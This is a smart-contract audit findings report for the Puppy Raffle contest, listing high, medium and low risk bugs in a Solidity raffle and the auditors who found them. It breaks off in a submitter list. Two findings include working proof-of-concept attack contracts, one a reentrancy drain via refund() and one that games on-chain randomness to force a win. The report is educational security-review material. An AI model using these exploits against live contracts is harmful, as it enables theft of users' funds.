# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Potential Loss of Funds During Prize Pool Distribution](#H-01)
    - [H-02. Reentrancy Vulnerability In refund() function ](#H-02)
    - [H-03. Randomness can be gamed](#H-03)
    - [H-04. `PuppyRaffle::refund` replaces an index with address(0) which can cause the function `PuppyRaffle::selectWinner` to always revert](#H-04)
    - [H-05. Typecasting from uint256 to uint64 in PuppyRaffle.selectWinner() May Lead to Overflow and Incorrect Fee Calculation](#H-05)
    - [H-06. Overflow/Underflow vulnerabilty for any version before 0.8.0](#H-06)
    - [H-07. Potential Front-Running Attack in `selectWinner` and `refund` Functions](#H-07)
- ## Medium Risk Findings
    - [M-01. `PuppyRaffle: enterRaffle` Use of gas extensive duplicate check leads to Denial of Service, making subsequent participants to spend much more gas than prev ones to enter](#M-01)
    - [M-02. Slightly increasing puppyraffle's contract balance will render `withdrawFees` function useless](#M-02)
    - [M-03. Impossible to win raffle if the winner is a smart contract without a fallback function](#M-03)
- ## Low Risk Findings
    - [L-01. Ambiguous index returned from PuppyRaffle::getActivePlayerIndex(address), leading to possible refund failures](#L-01)
    - [L-02. Missing `WinnerSelected`/`FeesWithdrawn` event emition in `PuppyRaffle::selectWinner`/`PuppyRaffle::withdrawFees` methods](#L-02)
    - [L-03. Participants are mislead by the rarity chances.](#L-03)
    - [L-04. PuppyRaffle::selectWinner() - L126: should use `>` instead of `>=`, because `raffleStartTime + raffleDuration` still represents an active raffle.](#L-04)
    - [L-05. Total entrance fee can overflow leading to the user paying little to nothing](#L-05)
    - [L-06. Fee should be 'totalAmountCollected-prizePool' to prevent decimal loss](#L-06)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 7
   - Medium: 3
   - Low: 6


# High Risk Findings

## <a id='H-01'></a>H-01. Potential Loss of Funds During Prize Pool Distribution

_Submitted by [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [zach030](/profile/clllg9trq0002ml0881bhkegb), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [cem](/profile/clkb9m88m0004l9082ly4fz49), [0xbjorn](/profile/clnxo3ksf0000l508i9e2vtom), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [araj](/profile/clma4kzm40000lb08cngnui6u), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [ararara](/profile/clntr7eq20000ia08oode1zz7), [sandman](/profile/clk3zgbsd002kjq08p5vnhq23), [nisedo](/profile/clk3saar60000l608gsamuvnw), [Walle](/profile/clo8ke9e9000qmp08s87wvsmn), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [Eric](/profile/clkbqsa510000mi082he56qby), [theirrationalone](/profile/clk46mun70016l5082te0md5t), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [Luka](/profile/clnuevrco000ul408x4ihghzy), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [danielvo102](/profile/clk3suqe2001cmj08y52zoqab), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [intellygentle](/profile/clnur0zc30005l308rt7rewm9), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [eLSeR17](/profile/cloa521640004k008nepn5h9o), [yeahChibyke](/profile/clk40bik4000wjl087tjqrtti), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [Aarambh](/profile/clk687ykf0000l608ovci3h3y), [TheCodingCanuck](/profile/clkg5xveq0000i9082f9kiksa), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [innertia](/profile/clkqyrmqu000gkz08274w833n), [WangAudit](/profile/clnxia5yx0006ju08lkeccntm), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Bigor](/profile/clny88ad5000ol9081zmfw656), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [0xlemon](/profile/clk70p00n000gl5082o0iufja), [Equious](/profile/clldzdkk60000mr082grbuj97), [cromewar](/profile/cljys3m0o0000ky08fun4ch8i), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [Louis](/profile/clloixi3x0000la08i46r5hc8), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [jasmine](/profile/clkarmt9n0000l908usstgujw), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [0x0bserver](/profile/clo5ejc7k0000k108dnby2kir). Selected submission by: [letsDoIt](/team/clkjtgvih0001jt088aqegxjj)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L125-L154

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L103

## Summary
In the `selectWinner` function, when a player has refunded and their address is replaced with address(0), the prize money may be sent to address(0), resulting in fund loss.

## Vulnerability Details
In the `refund` function if a user wants to refund his money then he will be given his money back and his address in the array will be replaced with `address(0)`. So lets say `Alice` entered in the raffle and later decided to refund her money then her address in the `player` array will be replaced with `address(0)`. And lets consider that her index in the array is `7th` so currently there is `address(0)` at `7th index`, so when `selectWinner` function will be called there isn't any kind of check that this 7th index can't be the winner so if this `7th` index will be declared as winner then all the prize will be sent to him which will actually lost as it will be sent to `address(0)`

## Impact
Loss of funds if they are sent to address(0), posing a financial risk.

## Tools Used
Manual Review

## Recommendations
Implement additional checks in the `selectWinner` function to ensure that prize money is not sent to `address(0)`
## <a id='H-02'></a>H-02. Reentrancy Vulnerability In refund() function 

_Submitted by [philfr](/profile/cln48o0rf0000mn08fc6i734d), [djanerch](/profile/clkv0whr4000wl608y1s0p7o4), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [cem](/profile/clkb9m88m0004l9082ly4fz49), [0xbjorn](/profile/clnxo3ksf0000l508i9e2vtom), [Zac369](/profile/clk5png2a0000l809z7kt06dn), [jerseyjoewalcott](/profile/clnueldbf000lky08h4g3kjx4), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [alsirang](/profile/clnvs6t2c000cjx08zxo9vgf4), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [0xgd](/profile/clo3l6cr5000cky08f01v4242), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [0xLuke4G1](/profile/clnum02zf0006l708sllkt43p), [SALUTEMADA](/profile/clmg8laec0000mn08bj0r2zog), [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc), [Cosine](/profile/clkc7trh30004l208e0okerdn), [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [zadev](/profile/clo4l66aa0000md08lazlawbn), [ararara](/profile/clntr7eq20000ia08oode1zz7), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [sandman](/profile/clk3zgbsd002kjq08p5vnhq23), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [nisedo](/profile/clk3saar60000l608gsamuvnw), [anjalit](/profile/cllp2b2js0000l108bfqql9at), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [theirrationalone](/profile/clk46mun70016l5082te0md5t), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Eric](/profile/clkbqsa510000mi082he56qby), [Luka](/profile/clnuevrco000ul408x4ihghzy), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [dcheng](/profile/clnw5u1te0006l708th66izul), [Omeguhh](/profile/clkvbx923003kl008u2lvm36y), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [intellygentle](/profile/clnur0zc30005l308rt7rewm9), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [danlipert](/profile/clnykqixa0000mf08qa9u8qoz), [MSaptarshi007](/profile/clo5qv6340012l908bg06iu1w), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Chandr](/profile/clka007jd0000k2086j3juoi9), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [Scoffield](/profile/cll10q0wm0000jx088qp7gads), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [ironside](/profile/clnu03xlr0000mp08r7fms6nl), [Random](/profile/clmarm50b0002md08d3iycbx4), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [dougo](/profile/clnvz1v7u0000mg07ikf4cqcd), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [BowTiedJerboa](/profile/cloc8261b001al208obsdjnwj), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [0xtekt](/profile/clodvp9c7000kjz08cxddlj4r), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [stakog](/profile/clmqkms6k0004mn08mbsf2p7f), [0xdark1337](/profile/clmfo5uje0000mg08bvvwu65u), [0xdangit](/profile/clnui7kb50000mi080ap2y4t5), [crypt0mate](/profile/clk82i8pg0000jo08jat0qepq), [mibiot13](/profile/clo38rr1s0000lc08x0q227fg), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [Oozman](/profile/clnu31wgx0000jy08f68hn16l), [zen4269](/profile/clnuh6eoq0012l408590tbzrz), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [sm4rty](/profile/clk4170ln003amb088n137st7), [David77](/profile/clll3wigw0008mf08byd7jzzy), [0xKriLuv](/profile/clo4gftul0016jv08pfpi5md6), [contractsecure](/profile/clk3y89700004jq08hsxugo8k), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Zurriken](/profile/clo7wuqk60000me08qwfbed9m), [innertia](/profile/clkqyrmqu000gkz08274w833n), [WangAudit](/profile/clnxia5yx0006ju08lkeccntm), [Aarambh](/profile/clk687ykf0000l608ovci3h3y), [0xSimeon](/profile/clk4oou2i0000l808pkf7krr7), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [00decree](/profile/clnge53mh0000jv08gajav1nt), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [Denzi](/profile/clnvfit56000bl008kg599zbt), [Louis](/profile/clloixi3x0000la08i46r5hc8), [ETHANHUNTIMF99](/profile/clnw21fzq0003le08a70dcond), [0xjarix](/profile/clmjdxnit0000mo08j0t9g44h), [0xhashiman](/profile/clofddxp4001ijz08hm9txokv), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [codyx](/profile/clo15yq5l0000ml08qecr06jr), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [0x0bserver](/profile/clo5ejc7k0000k108dnby2kir). Selected submission by: [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96C4-L105C6

## Summary
The `PuppyRaffle::refund()` function doesn't have any mechanism to prevent a reentrancy attack and doesn't follow the Check-effects-interactions pattern 
## Vulnerability Details
```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
In the provided PuppyRaffle contract is potentially vulnerable to reentrancy attacks. This is because it first sends Ether to msg.sender and then updates the state of the contract.a malicious contract could re-enter the refund function before the state is updated.

## Impact

If exploited, this vulnerability could allow a malicious contract to drain Ether from the PuppyRaffle contract, leading to loss of funds for the contract and its users.
```javascript
PuppyRaffle.players (src/PuppyRaffle.sol#23) can be used in cross function reentrancies:
- PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#79-92)
- PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#110-117)
- PuppyRaffle.players (src/PuppyRaffle.sol#23)
- PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#96-105)
- PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#125-154)
```
## POC
<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

contract AttackContract {
    PuppyRaffle public puppyRaffle;
    uint256 public receivedEther;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        require(msg.value > 0);

        // Create a dynamic array and push the sender's address
        address[] memory players = new address[](1);
        players[0] = address(this);

        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= msg.value) {
            receivedEther += msg.value;

            // Find the index of the sender's address
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

            if (playerIndex > 0) {
                // Refund the sender if they are in the raffle
                puppyRaffle.refund(playerIndex);
            }
        }
    }
}
```
we create a malicious contract (AttackContract) that enters the raffle and then uses its fallback function to repeatedly call refund before the PuppyRaffle contract has a chance to update its state.
</details>


## Tools Used
Manual Review

## Recommendations
To mitigate the reentrancy vulnerability, you should follow the Checks-Effects-Interactions pattern. This pattern suggests that you should make any state changes before calling external contracts or sending Ether.

Here's how you can modify the refund function:

```javascript
function refund(uint256 playerIndex) public {
address playerAddress = players[playerIndex];
require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

// Update the state before sending Ether
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);

// Now it's safe to send Ether
(bool success, ) = payable(msg.sender).call{value: entranceFee}("");
require(success, "PuppyRaffle: Failed to refund");


}
```

This way, even if the msg.sender is a malicious contract that tries to re-enter the refund function, it will fail the require check because the player's address has already been set to address(0).Also we changed the event is emitted before the external call, and the external call is the last step in the function. This mitigates the risk of a reentrancy attack.


## <a id='H-03'></a>H-03. Randomness can be gamed

_Submitted by [philfr](/profile/cln48o0rf0000mn08fc6i734d), [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [0xLuke4G1](/profile/clnum02zf0006l708sllkt43p), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [whiteh4t9527](/profile/clo5gva7c000qju08mwizp15i), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [cem](/profile/clkb9m88m0004l9082ly4fz49), [Zac369](/profile/clk5png2a0000l809z7kt06dn), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [anjalit](/profile/cllp2b2js0000l108bfqql9at), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [Cosine](/profile/clkc7trh30004l208e0okerdn), [zadev](/profile/clo4l66aa0000md08lazlawbn), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [araj](/profile/clma4kzm40000lb08cngnui6u), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [nisedo](/profile/clk3saar60000l608gsamuvnw), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), [Walle](/profile/clo8ke9e9000qmp08s87wvsmn), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [sandman](/profile/clk3zgbsd002kjq08p5vnhq23), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [mahivasisth](/profile/clk86z1bk000olh08he15prja), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [Luka](/profile/clnuevrco000ul408x4ihghzy), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [banditxbt](/profile/clob62zxy0000l3088imc9gu4), [SaudxInu](/profile/clntyl9000008k009s910t0zg), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [danlipert](/profile/clnykqixa0000mf08qa9u8qoz), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [Chandr](/profile/clka007jd0000k2086j3juoi9), [dougo](/profile/clnvz1v7u0000mg07ikf4cqcd), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [ironside](/profile/clnu03xlr0000mp08r7fms6nl), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [ararara](/profile/clntr7eq20000ia08oode1zz7), [eLSeR17](/profile/cloa521640004k008nepn5h9o), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [AnouarBF](/profile/clo3tpz750000l508wc1jr5jc), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [0xspryon](/profile/clo19fw280000mf08c4yazene), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [0xdark1337](/profile/clmfo5uje0000mg08bvvwu65u), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [Scoffield](/profile/cll10q0wm0000jx088qp7gads), [Random](/profile/clmarm50b0002md08d3iycbx4), [zen4269](/profile/clnuh6eoq0012l408590tbzrz), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [sh0lt0](/profile/clnw2tusk000rle08fcuompr0), [sm4rty](/profile/clk4170ln003amb088n137st7), [NeoRusI](/profile/clluihrv20000l8087gwt4h28), [ugrru](/profile/clnub5s6w000kmr08q6rgbu4u), [theinstructor](/profile/clnvsrne1001ymh08z4oz4pq9), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [dcheng](/profile/clnw5u1te0006l708th66izul), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [0xMUSA1337](/profile/clnxkvihy000ijq08teh393g3), [innertia](/profile/clkqyrmqu000gkz08274w833n), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [0xtekt](/profile/clodvp9c7000kjz08cxddlj4r), [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [0xAbhay](/profile/clnwpdjb00006jr088q416aog), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [Denzi](/profile/clnvfit56000bl008kg599zbt), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [Equious](/profile/clldzdkk60000mr082grbuj97), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [0xlemon](/profile/clk70p00n000gl5082o0iufja), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [Oozman](/profile/clnu31wgx0000jy08f68hn16l), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc), [damoklov](/profile/clnvpqak60009mh082jw2lgna), [cromewar](/profile/cljys3m0o0000ky08fun4ch8i), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [0xhashiman](/profile/clofddxp4001ijz08hm9txokv), [0xth30r3m](/profile/clk5x4c14000cl608o3dwdsjh), [codyx](/profile/clo15yq5l0000ml08qecr06jr), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [Louis](/profile/clloixi3x0000la08i46r5hc8), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [0x0bserver](/profile/clo5ejc7k0000k108dnby2kir). Selected submission by: [efecarranza](/profile/clnu83dx3000jl1088pfm1okk)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L128

## Summary

The randomness to select a winner can be gamed and an attacker can be chosen as winner without random element.

## Vulnerability Details

Because all the variables to get a random winner on the contract are blockchain variables and are known, a malicious actor can use a smart contract to game the system and receive all funds and the NFT.

## Impact

Critical

## Tools Used

Foundry

## POC

```
// SPDX-License-Identifier: No-License

pragma solidity 0.7.6;

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;

    function getPlayersLength() external view returns (uint256);

    function selectWinner() external;
}

contract Attack {
    IPuppyRaffle raffle;

    constructor(address puppy) {
        raffle = IPuppyRaffle(puppy);
    }

    function attackRandomness() public {
        uint256 playersLength = raffle.getPlayersLength();

        uint256 winnerIndex;
        uint256 toAdd = playersLength;
        while (true) {
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this),
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                toAdd;

            if (winnerIndex == playersLength) break;
            ++toAdd;
        }
        uint256 toLoop = toAdd - playersLength;

        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);

        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;
        raffle.enterRaffle{value: valueToSend}(playersToAdd);
        raffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

## Recommendations

Use Chainlink's VRF to generate a random number to select the winner. Patrick will be proud.
## <a id='H-04'></a>H-04. `PuppyRaffle::refund` replaces an index with address(0) which can cause the function `PuppyRaffle::selectWinner` to always revert

_Submitted by [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [zach030](/profile/clllg9trq0002ml0881bhkegb), [cem](/profile/clkb9m88m0004l9082ly4fz49), [araj](/profile/clma4kzm40000lb08cngnui6u), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [ararara](/profile/clntr7eq20000ia08oode1zz7), [sandman](/profile/clk3zgbsd002kjq08p5vnhq23), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [nisedo](/profile/clk3saar60000l608gsamuvnw), [Walle](/profile/clo8ke9e9000qmp08s87wvsmn), [Eric](/profile/clkbqsa510000mi082he56qby), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [Luka](/profile/clnuevrco000ul408x4ihghzy), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [danielvo102](/profile/clk3suqe2001cmj08y52zoqab), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [eLSeR17](/profile/cloa521640004k008nepn5h9o), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [Aarambh](/profile/clk687ykf0000l608ovci3h3y), [TheCodingCanuck](/profile/clkg5xveq0000i9082f9kiksa), 